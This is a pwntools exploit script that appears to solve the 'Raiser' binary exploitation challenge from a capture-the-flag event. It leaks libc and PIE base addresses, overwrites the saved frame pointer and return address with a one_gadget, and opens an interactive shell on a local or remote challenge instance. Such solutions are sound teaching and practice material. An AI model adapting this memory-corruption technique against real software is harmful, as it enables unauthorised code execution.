#!/usr/bin/env python3
import os
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/pwn/Raiser/raiser')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    # get libc base
    r.sendlineafter(b'base:\n> ', str(0x539).encode())
    r.sendlineafter(b'power:\n> ', str(19).encode())
    r.recvuntil(b'feature!\n')

    main_ret = int(r.recvline().strip().decode())
    libc.address = main_ret - libc.libc_start_main_return
    one_gadget = 0xeb66b

    # get pie base
    r.sendlineafter(b'base:\n> ', str(0x539).encode())
    r.sendlineafter(b'power:\n> ', str(21).encode())
    r.recvuntil(b'feature!\n')

    main = int(r.recvline().strip().decode())
    elf.address = main - elf.sym.main
    bss_800 = elf.bss() + 0x800

    log.info(f'elf.address: {hex(elf.address)}')
    log.info(f'libc.address: {hex(libc.address)}')

    # dummy
    for i in range(18):
        r.sendlineafter(b'base:\n> ', str(0).encode())
        r.sendlineafter(b'power:\n> ', str(0).encode())

    # set rbp
    r.sendlineafter(b'base:\n> ', str(elf.sym.power + 0x78).encode())
    r.sendlineafter(b'power:\n> ', str(0).encode())

    # set return
    r.sendlineafter(b'base:\n> ', str(one_gadget).encode())
    r.sendlineafter(b'power:\n> ', str(0).encode())

    # exit
    r.sendlineafter(b'base:\n> ', str(0).encode())
    r.sendlineafter(b'power:\n> ', str(bss_800).encode())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('nopsctf-c9afdf2ff27b-raiser-1.chals.io', 443, ssl=True)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
